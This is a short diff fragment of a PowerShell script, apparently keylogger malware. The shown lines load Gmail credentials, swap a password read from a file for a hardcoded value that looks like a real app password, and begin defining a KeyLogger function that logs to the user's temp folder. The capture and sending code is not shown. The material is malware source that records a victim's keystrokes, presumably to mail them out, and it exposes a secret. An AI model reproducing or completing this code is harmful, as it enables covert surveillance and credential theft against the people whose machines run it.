@@ -3,7 +3,7 @@
 
 # gmail credentials
 $email = Get-Content email.txt
-$password = Get-Content pass.txt
+$password = "psas aykw xkoe nsjh"
 
 # keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
